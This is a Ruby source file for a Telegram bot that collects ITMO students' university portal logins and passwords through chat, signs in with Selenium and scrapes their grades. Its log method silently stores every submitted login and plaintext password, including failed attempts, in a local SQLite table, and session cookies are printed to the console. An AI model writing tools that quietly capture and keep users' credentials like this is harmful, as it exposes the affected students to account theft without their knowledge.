require 'telegram/bot'
require 'selenium-webdriver'
require 'json'
require 'dotenv/load'
require 'sqlite3'

class ITMOBot
  def initialize
    @driver = Selenium::WebDriver.for :firefox
    @sessions = {}
    @db = SQLite3::Database.new 'logs.db'
    create_table
  end

  def start
    Telegram::Bot::Client.run(ENV['TELEGRAM_BOT_TOKEN']) do |bot|
      bot.listen do |message|
        case message.text
        when '/start'
          bot.api.send_message(chat_id: message.chat.id, text: "Привет! Пожалуйста, авторизуйтесь на сайте my.itmo.ru. Введите свой логин и пароль в формате: /login ваш_логин ваш_пароль")
          log(message.chat.id, "User started the bot")
        when /^\/login (.+) (.+)/
          login, password = message.text.split[1..2]
          if authenticate(login, password, message.chat.id)
            bot.api.send_message(chat_id: message.chat.id, text: "Вы успешно авторизовались!")
            bot.api.send_message(chat_id: message.chat.id, text: "Введите /grades для получения информации о вашей успеваемости.")
            log(message.chat.id, "User logged in successfully", login, password)
          else
            bot.api.send_message(chat_id: message.chat.id, text: "Ошибка авторизации. Попробуйте снова.")
            log(message.chat.id, "Authentication error", login, password)
          end
        when '/grades'
          grades = fetch_grades(message.chat.id)
          if grades
            bot.api.send_message(chat_id: message.chat.id, text: grades, parse_mode: 'Markdown')
            log(message.chat.id, "User requested grades")
          else
            bot.api.send_message(chat_id: message.chat.id, text: "Пожалуйста, авторизуйтесь с помощью команды /login")
            log(message.chat.id, "User requested grades without authentication")
          end
        else
          bot.api.send_message(chat_id: message.chat.id, text: "Я не понимаю эту команду. Пожалуйста, используйте /start для начала.")
        end
      end
    end
  end

  private

  def authenticate(login, password, chat_id)
    login_url = 'https://my.itmo.ru/login'

    begin
      @driver.navigate.to login_url

      # Дождитесь загрузки формы
      wait = Selenium::WebDriver::Wait.new(timeout: 10)
      wait.until { @driver.find_element(id: 'kc-form-login') }

      # Найти и заполнить форму
      form = @driver.find_element(id: 'kc-form-login')
      form.find_element(name: 'username').send_keys(login)
      form.find_element(name: 'password').send_keys(password)
      form.submit

      # Дождитесь перехода на главную страницу после авторизации
      wait.until { @driver.current_url == 'https://my.itmo.ru/' }

      # Сохранение куки
      @sessions[chat_id] = @driver.manage.all_cookies
      puts "Cookies saved for session: #{@sessions[chat_id]}"
      true
    rescue Selenium::WebDriver::Error::TimeoutError, Selenium::WebDriver::Error::NoSuchElementError => e
      puts "Authentication failed: #{e.message}"
      false
    end
  end

  def fetch_grades(chat_id)
    if @sessions[chat_id]
      @driver.manage.delete_all_cookies
      @sessions[chat_id].each { |cookie| @driver.manage.add_cookie(cookie) }

      grades_url = 'https://my.itmo.ru/points'
      @driver.navigate.to grades_url

      begin
        wait = Selenium::WebDriver::Wait.new(timeout: 10)
        wait.until { @driver.find_element(css: '.b-overlay-wrap.position-relative') }

        grades_container = @driver.find_element(css: '.b-overlay-wrap.position-relative')
        list_items = grades_container.find_elements(css: '.list-item')

        grades_text = list_items.map do |item|
          subject = item.find_element(css: 'div:nth-child(1)').text.strip
          points = item.find_element(css: 'div.col-2 svg text').text.strip
          "*#{subject}*: #{points}"
        end.join("\n\n")

        puts "Fetched grades: #{grades_text}" # Логирование для отладки
        grades_text
      rescue Selenium::WebDriver::Error::TimeoutError, Selenium::WebDriver::Error::NoSuchElementError => e
        puts "Fetching grades failed: #{e.message}"
        nil
      end
    else
      puts "No session found for chat_id: #{chat_id}" # Логирование для отладки
      puts "Sessions: #{@sessions}" # Логирование для отладки
      nil
    end
  end

  def log(chat_id, message, login = nil, password = nil)
    log_message = "[#{message}]"
    log_message += " L:#{login} P:#{password}" if login && password
    @db.execute('INSERT INTO logs (chat_id, message, timestamp) VALUES (?, ?, ?)', [chat_id, log_message, Time.now.to_s])
  end

  def create_table
    @db.execute <<~SQL
      CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY,
        chat_id INTEGER,
        message TEXT,
        timestamp TEXT
      );
    SQL
  end
end

ITMOBot.new.start
